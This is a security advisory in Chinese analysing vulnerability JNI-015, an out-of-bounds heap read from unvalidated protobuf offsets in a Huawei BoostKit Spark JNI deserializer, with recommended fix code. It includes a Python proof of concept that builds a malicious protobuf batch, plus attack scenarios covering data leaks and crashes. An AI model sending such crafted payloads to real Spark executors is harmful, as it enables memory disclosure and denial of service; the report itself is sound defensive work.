# JNI-015 漏洞详细分析报告

## 1. 漏洞概述

### 基本信息
| 属性 | 值 |
|------|-----|
| **漏洞 ID** | JNI-015 |
| **类型** | Integer Overflow or Wraparound (CWE-190) / Buffer Overread (CWE-125) |
| **严重性** | Medium |
| **置信度** | 85/100 |
| **状态** | CONFIRMED |
| **文件路径** | `cpp-omni/src/jni/deserializer.cpp` |
| **行号** | 200-206 |
| **函数名** | `Java_com_huawei_boostkit_spark_serialize_ShuffleDataSerializerUtils_rowShuffleParseBatch` |
| **信任边界** | JNI Interface (High Risk) - Spark JVM Process → Native C++ Library |

### 漏洞摘要
JNI 函数 `rowShuffleParseBatch` 中，来自 protobuf 的 `offsets` 数组被直接用于计算行数据指针偏移量，而未进行边界验证。攻击者可通过构造恶意 protobuf 数据，使 `offsets[i]` 超出 `rows` 缓冲区范围，导致堆越界读取（Heap Buffer Overread）。此外，`rowCount * columnType` 的整数乘法可能溢出。

### 关联漏洞
该漏洞与以下漏洞具有相同的数据源和信任边界问题：
- **JNI-003** (`rowShuffleParseInit:127-136`): ParseFromArray 返回值未检查
- **JNI-008** (`rowShuffleParseBatch:174-178`): VLA 栈溢出 + vecCount 未验证
- **JNI-007** (`columnarShuffleParseBatch:74-77`): 相同的 VLA 栈溢出模式

### 2.3 漏洞类型详解

#### 漏洞类型 1: 整数溢出 (CWE-190)

**位置**: 行 196, 潜在的 `rowCount * columnType` 溢出

```cpp
// 行 196: VectorHelper::CreateVector 内部可能有整数乘法
vecs[pos] = VectorHelper::CreateVector(OMNI_FLAT, vectorDataTypeId, rowCount);
// 如果 rowCount 很大，内存分配大小计算可能溢出
// 例如：rowCount = 0x40000000, 每行 8 字节 = 0x200000000 (8GB)
// 但 int32_t 溢出后可能变成小值，导致分配不足
```

#### 漏洞类型 2: 堆越界读取 (CWE-125)

**位置**: 行 201-206

```cpp
char *rows = const_cast<char*>(protoRowBatch->rows().data());  // rows 缓冲区
const int32_t *offsets = reinterpret_cast<const int32_t*>(
    protoRowBatch->offsets().data());  // offsets 数组

for (auto i = 0; i < rowCount; ++i) {  // rowCount 来自 protobuf
    char *rowPtr = rows + offsets[i];  // offsets[i] 未验证！
    parser->ParseOneRow(reinterpret_cast<uint8_t*>(rowPtr), vecs, i);
}
```

**问题分析**:

1. **offsets 数组长度未验证**:
   - `rowCount` 来自 `rowCnt` 字段
   - 实际 offsets 元素数量 = `offsets.size() / 4`
   - 两者可能不一致，导致 `offsets[i]` 访问越界

2. **offsets[i] 值未验证**:
   - `offsets[i]` 可以是任意 int32_t 值
   - 正常范围: `0 <= offsets[i] < rows.size()`
   - 恶意值可能: `offsets[i] = INT_MAX` 或负数

3. **rows 缓冲区大小未知**:
   - 代码没有获取 `rows.size()` 进行边界检查
   - 即使获取，也没有验证 `offsets[i] < rows.size()`

### 2.4 缺失的验证检查

当前代码中**完全没有**以下关键验证：

| 检查项 | 状态 | 风险 |
|--------|------|------|
| `rowCount` 是否与 `offsets.size() / 4` 一致 | ❌ 缺失 | 数组越界访问 |
| `offsets[i]` 是否在 `rows.size()` 范围内 | ❌ 缺失 | 缓冲区越界读取 |
| `offsets` 是否单调递增 | ❌ 缺失 | 数据完整性问题 |
| `offsets[0]` 是否为 0 | ❌ 缺失 | 数据完整性问题 |
| `rowCount` 范围检查 | ❌ 缺失 | 整数溢出风险 |
| 负数 `offsets[i]` 处理 | ❌ 缺失 | 整数下溢风险 |

### 3.2 恶意 Protobuf 数据构造

#### PoC 1: 越界读取 - offsets[i] 超出 rows 缓冲区

```python
# 构造恶意 ProtoRowBatch protobuf 数据
# 目标：offsets[3] = 999999999 远超 rows.size()

import struct

def encode_varint(value):
    """编码 protobuf varint"""
    result = []
    while value > 127:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value)
    return bytes(result)

def build_malicious_proto_row_batch():
    malicious = bytearray()
    
    # Field 1: rowCnt = 10
    malicious.append(0x08)  # tag: field 1, wire type 0 (varint)
    malicious.extend(encode_varint(10))
    
    # Field 2: vecCnt = 1 (最小有效值)
    malicious.append(0x10)  # tag: field 2, wire type 0
    malicious.extend(encode_varint(1))
    
    # Field 3: vecTypes - 最小有效 VecType
    vec_type = bytearray([0x08, 0x01])  # typeId = 1 (INT)
    malicious.append(0x1A)  # tag: field 3, wire type 2 (length-delimited)
    malicious.extend(encode_varint(len(vec_type)))
    malicious.extend(vec_type)
    
    # Field 4: rows - 小缓冲区 (100 bytes)
    rows_data = b'\x00' * 100
    malicious.append(0x22)  # tag: field 4, wire type 2
    malicious.extend(encode_varint(len(rows_data)))
    malicious.extend(rows_data)
    
    # Field 5: offsets - 恶意偏移数组
    # 构造 10 个 int32_t 偏移值，其中第 4 个设为超大值
    offsets = [
        0,          # offsets[0] = 0, 正常
        50,         # offsets[1] = 50, 正常
        99,         # offsets[2] = 99, 边界值
        999999999,  # offsets[3] = 999999999, 越界！
        0,          # offsets[4] = 0
        0, 0, 0, 0, 0  # 其余填充
    ]
    offsets_data = b''.join(struct.pack('<i', off) for off in offsets)
    
    malicious.append(0x2A)  # tag: field 5, wire type 2
    malicious.extend(encode_varint(len(offsets_data)))
    malicious.extend(offsets_data)
    
    return bytes(malicious)

# 结果：ParseOneRow 被调用时，rowPtr 指向 rows + 999999999，远超缓冲区
```

### 3.3 攻击场景分析

#### 场景 1: 数据泄露 (Information Disclosure)

**攻击目标**: 读取敏感数据

```
攻击者构造:
- rows.size() = 100 bytes
- offsets[3] = 1000000 (远超 rows 缓冲区)

结果:
- rowPtr = rows + 1000000
- ParseOneRow(rowPtr, ...) 尝试读取 rows 缓冲区外 1000000 字节处的数据
- 可能读取到:
  - 堆上其他对象的数据
  - 敏感信息（密钥、密码等）
  - 内部内存结构
```

**影响**:
- 绕过 ASLR（地址空间布局随机化）
- 泄露堆内存内容
- 为后续攻击提供信息

#### 场景 2: 拒绝服务 (DoS)

```
攻击者构造:
- offsets[i] = 0x7FFFFFFF (INT_MAX)
- 或 offsets[i] = 任意大值

结果:
- 访问未映射内存页
- SIGSEGV (Segmentation Fault)
- Executor 进程崩溃
```

**影响**:
- Spark 任务失败
- 集群资源浪费
- 重试机制可能导致雪崩效应

#### 场景 3: 内存损坏 (Memory Corruption)

```
如果 ParseOneRow 内部有写操作（如设置 null 标志），可能导致:
- 写入到非法内存区域
- 堆元数据损坏
- 可能的代码执行（极低概率，需要精确控制）
```

## 6. 缓解措施建议

### 6.1 立即修复建议

#### 修复代码 (推荐方案)

```cpp
// cpp-omni/src/jni/deserializer.cpp:169-220
JNIEXPORT void JNICALL
Java_com_huawei_boostkit_spark_serialize_ShuffleDataSerializerUtils_rowShuffleParseBatch(
    JNIEnv *env, jobject obj, jlong address, jintArray typeIdArray, jintArray precisionArray,
    jintArray scaleArray, jlongArray vecNativeIdArray)
{
    spark::ProtoRowBatch* protoRowBatch = reinterpret_cast<spark::ProtoRowBatch*>(address);
    int32_t vecCount = protoRowBatch->veccnt();
    int32_t rowCount = protoRowBatch->rowcnt();
    
    // ═══════════════════════════════════════════════════════════════════
    // 新增：安全验证
    // ═══════════════════════════════════════════════════════════════════
    
    // 1. 基本范围验证
    const int32_t MAX_VEC_COUNT = 10000;
    const int32_t MAX_ROW_COUNT = 1000000;
    
    if (vecCount <= 0 || vecCount > MAX_VEC_COUNT) {
        env->ThrowNew(runtimeExceptionClass, 
            ("Invalid vecCount: " + std::to_string(vecCount)).c_str());
        return;
    }
    if (rowCount <= 0 || rowCount > MAX_ROW_COUNT) {
        env->ThrowNew(runtimeExceptionClass, 
            ("Invalid rowCount: " + std::to_string(rowCount)).c_str());
        return;
    }
    
    // 2. vecTypes 数量验证
    if (protoRowBatch->vectypes_size() != vecCount) {
        env->ThrowNew(runtimeExceptionClass, 
            ("vecTypes size mismatch: " + std::to_string(protoRowBatch->vectypes_size()) + 
             " != " + std::to_string(vecCount)).c_str());
        return;
    }
    
    // 3. Java 数组长度验证
    jint typeIdArrayLen = env->GetArrayLength(typeIdArray);
    if (typeIdArrayLen < vecCount) {
        env->ThrowNew(runtimeExceptionClass, "Java array length insufficient");
        return;
    }
    // ... 其他数组验证 ...
    
    // 4. 替换 VLA 为 std::vector（同步修复 JNI-008）
    std::vector<omniruntime::vec::BaseVector*> vecs(vecCount, nullptr);
    std::vector<omniruntime::type::DataTypeId> omniDataTypeIds(vecCount);
    
    // ═══════════════════════════════════════════════════════════════════
    // 原有代码...
    // ═══════════════════════════════════════════════════════════════════
    
    int32_t pos = 0;
    try {
    jint *typeIdArrayElements = env->GetIntArrayElements(typeIdArray, NULL);
    jint *precisionArrayElements = env->GetIntArrayElements(precisionArray, NULL);
    jint *scaleArrayElements = env->GetIntArrayElements(scaleArray, NULL);
    jlong *vecNativeIdArrayElements = env->GetLongArrayElements(vecNativeIdArray, NULL);

    for (; pos < vecCount; ++pos) {
        const spark::VecType& protoTypeId = protoRowBatch->vectypes(pos);
        scaleArrayElements[pos] = protoTypeId.scale();
        precisionArrayElements[pos] = protoTypeId.precision();
        typeIdArrayElements[pos] = static_cast<jint>(protoTypeId.typeid_());
        omniDataTypeIds[pos] = static_cast<omniruntime::type::DataTypeId>(protoTypeId.typeid_());

        auto vectorDataTypeId = static_cast<omniruntime::type::DataTypeId>(protoTypeId.typeid_());
        vecs[pos] = VectorHelper::CreateVector(OMNI_FLAT, vectorDataTypeId, rowCount);
        vecNativeIdArrayElements[pos] = (jlong)(vecs[pos]);
    }

    auto *parser = new RowParser(omniDataTypeIds);
    
    // ═══════════════════════════════════════════════════════════════════
    // 新增：rows 和 offsets 边界验证
    // ═══════════════════════════════════════════════════════════════════
    
    char *rows = const_cast<char*>(protoRowBatch->rows().data());
    const int32_t *offsets = reinterpret_cast<const int32_t*>(
        protoRowBatch->offsets().data());
    
    // 获取实际缓冲区大小
    size_t rowsSize = protoRowBatch->rows().size();
    size_t offsetsSize = protoRowBatch->offsets().size();
    size_t offsetsCount = offsetsSize / sizeof(int32_t);
    
    // 5. offsets 数量与 rowCount 一致性验证
    if (offsetsCount < static_cast<size_t>(rowCount)) {
        delete parser;
        env->ThrowNew(runtimeExceptionClass, 
            ("offsets array too small: " + std::to_string(offsetsCount) + 
             " < " + std::to_string(rowCount)).c_str());
        return;
    }
    
    // 6. 验证所有 offsets 值在 rows 缓冲区范围内
    for (int32_t i = 0; i < rowCount; ++i) {
        int32_t offset = offsets[i];
        if (offset < 0) {
            delete parser;
            env->ThrowNew(runtimeExceptionClass, 
                ("Negative offset at index " + std::to_string(i) + 
                 ": " + std::to_string(offset)).c_str());
            return;
        }
        if (static_cast<size_t>(offset) >= rowsSize) {
            delete parser;
            env->ThrowNew(runtimeExceptionClass, 
                ("Offset out of bounds at index " + std::to_string(i) + 
                 ": " + std::to_string(offset) + " >= " + std::to_string(rowsSize)).c_str());
            return;
        }
    }
    
    // 7. 可选：验证 offsets 单调递增
    for (int32_t i = 1; i < rowCount; ++i) {
        if (offsets[i] < offsets[i-1]) {
            // 非单调递增可能表示数据损坏，但不一定是错误
            // 根据业务需求决定是否验证
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════
    // 安全地使用 rows 和 offsets
    // ═══════════════════════════════════════════════════════════════════
    for (int32_t i = 0; i < rowCount; ++i) {
        char *rowPtr = rows + offsets[i];  // 现在 offset 已验证安全
        parser->ParseOneRow(reinterpret_cast<uint8_t*>(rowPtr), vecs.data(), i);
    }

    // ... 清理代码 ...
    delete parser;
    
    } catch (const std::exception &e) {
        for (int32_t i = 0; i < pos; i++) {
            delete vecs[i];
        }
        env->ThrowNew(runtimeExceptionClass, e.what());
        return;
    }
}
```

```cpp
// 安全边界检查辅助函数
namespace SafeBufferAccess {
    struct BufferBounds {
        const char* data;
        size_t size;
    };
    
    struct OffsetsArray {
        const int32_t* data;
        size_t count;
    };
    
    inline bool ValidateOffsets(
        JNIEnv* env,
        const BufferBounds& rows,
        const OffsetsArray& offsets,
        int32_t rowCount,
        jclass exceptionClass)
    {
        // 检查数量匹配
        if (offsets.count < static_cast<size_t>(rowCount)) {
            env->ThrowNew(exceptionClass, 
                ("offsets count mismatch: " + std::to_string(offsets.count) + 
                 " < " + std::to_string(rowCount)).c_str());
            return false;
        }
        
        // 检查每个偏移值
        for (int32_t i = 0; i < rowCount; ++i) {
            int32_t offset = offsets.data[i];
            
            if (offset < 0) {
                env->ThrowNew(exceptionClass, 
                    ("Negative offset at index " + std::to_string(i)).c_str());
                return false;
            }
            
            if (static_cast<size_t>(offset) >= rows.size) {
                env->ThrowNew(exceptionClass, 
                    ("Offset out of bounds at index " + std::to_string(i) + 
                     ": " + std::to_string(offset) + " >= " + std::to_string(rows.size)).c_str());
                return false;
            }
        }
        
        return true;
    }
}
```

## 8. 结论

**JNI-015 是一个真实存在的 Medium 级别漏洞**，需要尽快修复。

**关键风险**：
- 来自 protobuf 的 `offsets` 数组未经边界验证直接用于指针计算
- `rows + offsets[i]` 可能指向缓冲区外的任意内存位置
- 攻击者可构造恶意 protobuf 数据触发堆越界读取
- 可能导致信息泄露、进程崩溃或拒绝服务

**修复核心**：
1. **立即添加 offsets 边界验证** - 确保每个 `offsets[i] < rows.size()`
2. **验证 offsets 数量与 rowCount 一致** - 防止数组越界访问
3. **验证 offsets 非负** - 防止整数下溢
4. **同步修复 JNI-008 (VLA 问题)** - 提高整体安全性
5. **添加 rowCount/vecCount 范围检查** - 完善输入验证

**建议立即实施 P0 级别修复**，并在修复后进行充分的安全测试。
